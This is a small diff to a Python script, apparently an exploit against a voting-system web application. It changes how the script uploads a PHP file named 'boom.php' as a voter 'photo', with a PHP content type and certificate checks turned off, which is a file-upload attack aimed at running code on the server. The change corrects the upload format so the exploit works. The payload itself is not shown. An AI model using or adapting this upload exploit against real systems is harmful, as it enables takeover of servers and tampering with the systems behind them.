@@ -51,7 +51,7 @@ class VoteSystem():
             'firstname':'test','lastname':'voter','password':'passw0rd','add':''
         } 
         fileup = { 
-            'photo':('boom.php',payload,{'Content-Type':'application/x-php'},{'Content-Disposition':'form-data'})
+            'photo':('boom.php',payload,'application/x-php',{'Content-Disposition':'form-data'})
         } 
 
         req_url_upload = session.post(url_upload,data=fdata,files=fileup,verify=False)
